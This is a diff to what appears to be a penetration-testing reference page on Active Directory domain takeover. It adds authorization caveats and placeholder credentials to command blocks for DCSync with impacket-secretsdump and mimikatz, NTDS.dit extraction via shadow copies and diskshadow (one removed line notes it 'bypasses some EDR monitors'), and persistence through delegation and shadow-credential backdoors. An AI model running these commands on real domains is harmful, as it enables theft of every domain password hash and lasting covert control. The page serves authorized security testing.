@@ -11,6 +11,9 @@ tags:
 
 # Domain Dominance, DCSync & Persistence
 
+!!! note "What this page is doing"
+    This page describes high-impact validation and recovery-sensitive actions. Use an isolated lab or explicit client approval, prefer a canary objective, document blast radius before execution, and treat cleanup and key rotation as part of the test.
+
 !!! danger "Tier 0 Destructive Actions"
     Everything on this page is **destructive and heavily audited**. In client engagements, obtain explicit authorization before DCSync, SID History injection, or Golden Ticket creation, and document blast radius in advance.
 
@@ -21,41 +24,69 @@ tags:
 Any principal with `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (Domain Admins, Enterprise Admins, or an ACL you abused) can replicate password hashes from the DC — **without touching it**.
 
 ```bash
-# --- Dump a single high-value account ---
-impacket-secretsdump '<DOMAIN>/<USER>:Password123!@<DC_IP>' -just-dc-user krbtgt
-impacket-secretsdump '<DOMAIN>/<USER>:Password123!@<DC_IP>' -just-dc-user administrator
-# --- Full domain dump (all NTLM hashes + Kerberos keys) ---
-impacket-secretsdump -just-dc '<DOMAIN>/<USER>:Password123!@<DC_IP>' -outputfile dcsync_full
-# --- With a hash / ticket instead of a password ---
-impacket-secretsdump -just-dc-ntlm -hashes :<NTHASH> '<DOMAIN>/administrator@<DC_IP>'
+# Dump only the approved canary account first; do not collect more hashes than needed.
+impacket-secretsdump '<DOMAIN>/<USER>:<TEST_PASSWORD>@<DC_IP>' \
+  -just-dc-user <APPROVED_TEST_ACCOUNT>
+
+# If the ROE explicitly requires a domain-wide proof, record the scope and output path.
+impacket-secretsdump '<DOMAIN>/<USER>:<TEST_PASSWORD>@<DC_IP>' \
+  -just-dc \
+  -outputfile dcsync-approved-proof
+
+# Use a previously approved hash or Kerberos cache only when the scope allows it.
+impacket-secretsdump -just-dc-ntlm \
+  -hashes :<NTHASH> \
+  '<DOMAIN>/administrator@<DC_IP>'
 export KRB5CCNAME=administrator.ccache
 impacket-secretsdump -just-dc -k -no-pass <DC_HOST>.<DOMAIN>
-# --- Windows-side alternative ---
-# mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
-# .\SharpKatz.exe --Command dcsync --User <DOMAIN>\krbtgt --Domain <DOMAIN>
-# .\nanodump.exe (LSASS dump) then parse offline with pypykatz
-# --- Parse any LSASS dump offline ---
-pypykatz lsa minidump lsass.dmp
+```
+
+Windows-side tools and their prompts are reference text, not Bash input:
+
+```text
+# Mimikatz: lsadump::dcsync /domain:<DOMAIN> /user:<APPROVED_TEST_ACCOUNT>
+# SharpKatz: .\SharpKatz.exe --Command dcsync --User <DOMAIN>\<APPROVED_TEST_ACCOUNT> --Domain <DOMAIN>
+```
+
+Parse any approved dump offline and store it in the encrypted evidence location:
+
+```bash
+# Parse the lab or engagement artifact without sending it to a third party.
+pypykatz lsa minidump <APPROVED_LSASS_DUMP>
 ```
 
 ---
 
 ## 2. NTDS.dit Extraction (Offline Domain Dump)
 
-```bash
-# --- Option A: Volume Shadow Copy (on the DC) ---
+```powershell
+# Only use Volume Shadow Copy on an approved lab or explicitly scoped DC.
 vssadmin create shadow /for=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
-# Also copy SYSTEM and SECURITY hives (needed for decrypting the PEK)
+
+# Copy the database and required hives from the reviewed shadow path.
+Copy-Item -LiteralPath '<SHADOW_PATH>\Windows\NTDS\NTDS.dit' `
+  -Destination 'C:\Windows\Temp\ntds.dit'
 reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
 reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
-# --- Option B: Remotely via Impacket (RPC) ---
-impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:Password123!@<DC_IP>' -use-vss
-# --- Option C: Extract NTDS from a mounted VHDX/Disk (cloud/on-prem backups) ---
-# Mount the virtual disk, copy NTDS.dit + SYSTEM hive, then parse offline:
-impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile ad_ntds_dump
-# --- Option D: DiskShadow (native Windows utility that bypasses some EDR monitors) ---
-diskshadow /s script.txt # script.txt contains exec/copy commands
+```
+
+```bash
+# A remote DCSync/VSS collection is high impact; prefer a canary account and
+# store output in the approved encrypted evidence directory.
+impacket-secretsdump -just-dc-ntlm \\
+  '<DOMAIN>/<USER>:<TEST_PASSWORD>@<DC_IP>' \\
+  -use-vss \\
+  -outputfile approved-ntds-proof
+
+# For an authorized offline disk or backup, parse only the supplied artifact.
+impacket-secretsdump -ntds <NTDS_FILE> -system <SYSTEM_HIVE> LOCAL \\
+  -outputfile approved-offline-proof
+```
+
+```text
+# DiskShadow is a native Windows utility. Use it only when the ROE names an
+# offline extraction test and the script has been reviewed before execution.
+diskshadow /s <REVIEWED_SCRIPT>
 ```
 
 ---
@@ -138,7 +169,12 @@ impacket-dacledit -action write -rights FullControl -principal '<USER>' \
 # Wait for SDProp (~60 min) OR force it:
 # PowerShell> Invoke-ADSDPropagation (or: Set-ADObject on adminCount)
 # --- Delegation backdoor on a machine (persistence + lateral movement) ---
-impacket-rbcd -delegate-from 'PWNED$' -delegate-to 'FILESERVER$' -action write -dc-ip <DC_IP> '<DOMAIN>/<USER>:Password123!'
+impacket-rbcd \
+  -delegate-from 'PWNED$' \
+  -delegate-to 'FILESERVER$' \
+  -action write \
+  -dc-ip <DC_IP> \
+  '<DOMAIN>/<USER>:<TEST_PASSWORD>'
 # --- Shadow credentials persistence on a DA account ---
 certipy-ad shadow add -u '<USER>@<DOMAIN>' -p 'Password123!' -account 'DomainAdmin2' -dc-ip <DC_IP>
 # --- Cleanup checklist (always run before leaving) ---
